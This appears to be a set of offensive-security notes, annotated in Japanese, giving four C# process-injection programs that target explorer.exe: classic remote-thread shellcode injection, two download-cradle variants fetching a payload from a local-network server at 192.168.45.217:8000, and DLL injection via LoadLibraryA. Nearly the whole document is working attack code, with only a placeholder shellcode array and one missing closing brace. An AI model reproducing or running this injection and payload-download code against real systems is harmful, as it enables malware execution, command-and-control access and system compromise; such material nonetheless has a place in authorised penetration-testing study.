# Process Injection
### win32api
ハードコード
```c#
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            Process[] localByName = Process.GetProcessesByName("explorer");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[868] {0xfc,0x48,0xd5};


            IntPtr outSize;
            bool written = WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
```

ダウンロードクレードル
```c#
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            Process[] localByName = Process.GetProcessesByName("explorer");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
            byte[] buf = new WebClient().DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
            int size = buf.Length;
            IntPtr outSize;
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)size, 0x3000, 0x40);
            bool written = WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
```

### nt.dll
```c#
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        // NtCreateSection: 共有メモリセクションを作成
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        // NtMapViewOfSection: セクションをプロセスにマップ
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out long SectionOffset,
            out UIntPtr ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        // NtUnmapViewOfSection: マップを解除
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

        // NtClose: ハンドルを閉じる
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtClose(IntPtr Handle);

        static void Main(string[] args)
        {
            // ターゲットプロセスを取得
            Process[] localByName = Process.GetProcessesByName("explorer");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);

            // シェルコードをダウンロード
            byte[] buf = new WebClient().DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
            long size = buf.Length;

            // ① NtCreateSection: RWXセクションを作成
            IntPtr sectionHandle = IntPtr.Zero;
            NtCreateSection(
                ref sectionHandle,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref size,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x8000000,      // SEC_COMMIT
                IntPtr.Zero);

            // ② NtMapViewOfSection: 自プロセスにRWでマップ
            IntPtr localAddr = IntPtr.Zero;
            UIntPtr viewSize = UIntPtr.Zero;
            long sectionOffset = 0;
            NtMapViewOfSection(
                sectionHandle,
                GetCurrentProcess(),
                ref localAddr,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,              // ViewUnmap
                0,
                0x04);          // PAGE_READWRITE

            // ③ シェルコードをローカルバッファに書き込む（WriteProcessMemory不要）
            Marshal.Copy(buf, 0, localAddr, buf.Length);

            // ④ NtMapViewOfSection: リモートプロセスにRXでマップ
            IntPtr remoteAddr = IntPtr.Zero;
            NtMapViewOfSection(
                sectionHandle,
                hProcess,
                ref remoteAddr,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,              // ViewUnmap
                0,
                0x20);          // PAGE_EXECUTE_READ

            // ⑤ リモートスレッドで実行
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);

            // ⑥ クリーンアップ
            NtUnmapViewOfSection(GetCurrentProcess(), localAddr);
            NtClose(sectionHandle);
        }
    }
}
```

## DLL Process Injection
ダウンロードクレードル
```c#
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.217:8000/agent.x64_http.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllName.Length, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```